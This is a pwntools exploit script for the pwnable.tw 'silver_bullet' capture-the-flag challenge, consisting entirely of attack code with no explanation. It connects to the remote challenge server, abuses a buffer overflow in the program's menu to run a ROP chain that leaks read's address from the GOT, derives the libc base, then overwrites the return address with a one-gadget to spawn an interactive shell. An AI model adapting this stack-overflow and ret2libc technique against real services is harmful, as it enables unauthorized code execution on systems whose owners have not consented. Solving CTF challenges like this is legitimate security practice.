from pwn import *


#r = process("./silver_bullet")
r = remote("chall.pwnable.tw",10103)
pause()
#libc = ELF("/lib/i386-linux-gnu/libc.so.6")
libc = ELF("libc_32.so.6")

def create_bullet(bullet):
	r.sendline("1")
	r.recvuntil(":")
	r.sendline(bullet)
	r.recvuntil("choice :")

def power_up(power):
	r.sendline("2")
	r.recvuntil(":")
	r.sendline(power)
	r.recvuntil("choice :")

def beat(w=1):
	r.sendline("3")
	if w:
		r.recvuntil("choice :")


main = 0x08048954
popret=0x08048475
putsplt = 0x80484a8
readgot = 0x0804afd0

rop = p32(putsplt)
rop += p32(main)
rop += p32(readgot)

create_bullet("\x01"*(0x30-1))
power_up("PWNY")
power_up("A"*0x7+rop)
beat()
beat(w=0)

r.recvuntil("win !!")
r.recvline()
leak =  u32(r.recvline()[:4])
libc_base = leak - libc.symbols["read"]
one_shot = libc_base + 0x3a819 #0x3cbea

print "readGot @",hex(leak)
print "libc base @",hex(libc_base)

create_bullet("\x01"*(0x30-1))
power_up("PWNY")
power_up("A"*0x7+p32(one_shot))
beat()
beat(w=0)

r.interactive()
